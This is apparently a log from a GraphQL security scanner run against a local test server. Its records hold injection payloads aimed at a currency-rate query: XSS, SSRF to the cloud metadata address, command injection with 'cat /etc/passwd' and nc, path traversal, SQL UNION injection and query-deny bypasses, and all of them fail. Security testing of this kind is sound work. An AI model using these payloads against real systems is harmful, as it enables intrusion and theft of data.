+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"<img src=x onerror=alert(document.domain)>\")\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:25:10.602404Z",
+    "count": 24,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"http://169.254.169.254/latest/meta-data/\")\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:25:12.401267Z",
+    "count": 25,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD; nc 127.0.0.1 8080\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:25:13.990110Z",
+    "count": 26,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"file:///etc/passwd\")\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:25:16.379470Z",
+    "count": 27,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"<iframe src='javascript:alert(1)'>\")\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:25:18.162181Z",
+    "count": 28,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\")\n  __typename\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.011,
+        "timestamp": "2025-10-07T02:25:21.138522Z",
+        "response_body": {
+          "data": {
+            "getCurrentRate": null,
+            "__typename": "Query"
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.008,
+        "timestamp": "2025-10-07T02:25:21.147010Z",
+        "response_body": {
+          "data": {
+            "bypass1": null,
+            "bypass2": "Query"
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 29,
+    "timestamp": "2025-10-07T02:25:21.147105Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.011,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  bypass1: getCurrentRate(mainCurrencySymbol: \"USD\")\n  bypass2: __typename\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.007,
+        "timestamp": "2025-10-07T02:25:23.340176Z",
+        "response_body": {
+          "data": {
+            "getCurrentRate": null,
+            "__typename": "Query"
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-07T02:25:23.345549Z",
+        "response_body": {
+          "data": {
+            "bypass1": null,
+            "bypass2": "Query"
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 30,
+    "timestamp": "2025-10-07T02:25:23.345581Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.012,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    subscriptionType {\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.009,
+    "timestamp": "2025-10-07T02:25:25.241553Z",
+    "count": 31,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 18
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ScalarLeafsRule.js:33:33)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\") \n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:25:27.107766Z",
+    "count": 32,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery getCurrentRate {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-07T02:26:00.129132Z",
+    "count": 33,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD' UNION SELECT * FROM currencies--\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:26:02.044932Z",
+    "count": 34,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"<script>alert(document.cookie)</script>\")\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:26:04.902185Z",
+    "count": 35,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"http://169.254.169.254/latest/meta-data/\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.007,
+    "timestamp": "2025-10-07T02:26:06.755374Z",
+    "count": 36,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"; cat /etc/passwd #\")\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:26:08.306606Z",
+    "count": 37,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"../../../etc/passwd\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:26:10.644926Z",
+    "count": 38,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"<img src=x onerror=alert(1)>\")\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.011,
+    "timestamp": "2025-10-07T02:26:13.371651Z",
+    "count": 39,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\")\n  getCurrentRate(mainCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.012,
+        "timestamp": "2025-10-07T02:26:15.478985Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Fields \"getCurrentRate\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional.",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 3
+                },
+                {
+                  "line": 4,
+                  "column": 3
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED",
+                "exception": {
+                  "stacktrace": [
+                    "GraphQLError: Fields \"getCurrentRate\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional.",
+                    "    at Object.SelectionSet (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/OverlappingFieldsCanBeMergedRule.js:67:29)",
+                    "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                    "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                    "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                    "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                    "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                    "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                    "    at Generator.next (<anonymous>)",
+                    "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                    "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+                  ]
+                }
+              }
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.007,
+        "timestamp": "2025-10-07T02:26:15.485670Z",
+        "response_body": {
+          "data": {
+            "a": null,
+            "b": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 40,
+    "timestamp": "2025-10-07T02:26:15.485710Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.011,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  a: getCurrentRate(mainCurrencySymbol: \"USD\")\n  b: getCurrentRate(mainCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 400,
+        "request_time_seconds": 0.008,
+        "timestamp": "2025-10-07T02:26:17.428150Z",
+        "response_body": {
+          "errors": [
+            {
+              "message": "Fields \"getCurrentRate\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional.",
+              "locations": [
+                {
+                  "line": 3,
+                  "column": 3
+                },
+                {
+                  "line": 4,
+                  "column": 3
+                }
+              ],
+              "extensions": {
+                "code": "GRAPHQL_VALIDATION_FAILED",
+                "exception": {
+                  "stacktrace": [
+                    "GraphQLError: Fields \"getCurrentRate\" conflict because they have differing arguments. Use different aliases on the fields to fetch both if this was intentional.",
+                    "    at Object.SelectionSet (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/OverlappingFieldsCanBeMergedRule.js:67:29)",
+                    "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                    "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                    "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                    "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                    "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                    "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                    "    at Generator.next (<anonymous>)",
+                    "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                    "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+                  ]
+                }
+              }
+            }
+          ]
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.005,
+        "timestamp": "2025-10-07T02:26:17.433108Z",
+        "response_body": {
+          "data": {
+            "a": null,
+            "b": null
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 41,
+    "timestamp": "2025-10-07T02:26:17.433133Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.013,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Cannot query field \"episodesByIds\" on type \"Query\".",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/FieldsOnCorrectTypeRule.js:46:31)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate {\n    queryType {\n      name\n    }\n    mutationType {\n      name\n    }\n    types {\n      name\n      kind\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.01,
+    "timestamp": "2025-10-07T02:26:20.111448Z",
+    "count": 42,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 18
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" must not have a selection since type \"Float\" has no subfields.",
+                "    at Object.Field (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ScalarLeafsRule.js:33:33)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        },
+        {
+          "message": "Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Field \"getCurrentRate\" argument \"mainCurrencySymbol\" of type \"String!\" is required, but it was not provided.",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/ProvidedRequiredArgumentsRule.js:62:33)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:344:29)",
+                "    at Object.leave (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:390:21)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", __typename: \"Exploit\")\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.012,
+    "timestamp": "2025-10-07T02:26:21.927651Z",
+    "count": 43,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Unknown argument \"__typename\" on field \"Query.getCurrentRate\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 45
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED",
+            "exception": {
+              "stacktrace": [
+                "GraphQLError: Unknown argument \"__typename\" on field \"Query.getCurrentRate\".",
+                "    at Object.Argument (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/rules/KnownArgumentNamesRule.js:46:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:323:29)",
+                "    at Object.enter (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/utilities/TypeInfo.js:370:25)",
+                "    at visit (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/language/visitor.js:243:26)",
+                "    at Object.validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/graphql/validation/validate.js:69:24)",
+                "    at validate (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:221:34)",
+                "    at Object.<anonymous> (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:118:42)",
+                "    at Generator.next (<anonymous>)",
+                "    at fulfilled (/Users/sina/Documents/GraphQLer2022/test_server/node_modules/apollo-server-core/dist/requestPipeline.js:5:58)",
+                "    at process.processTicksAndRejections (node:internal/process/task_queues:105:5)"
+              ]
+            }
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD\", foreignCurrencySymbol: \"EUR\")\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.008,
+    "timestamp": "2025-10-07T02:26:53.720946Z",
+    "count": 44,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "getCurrentRate": null
+      }
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  getCurrentRate(mainCurrencySymbol: \"USD' UNION SELECT * FROM currencies --\")\n}\n",
+      "vulnerability_type": "sql_injection"
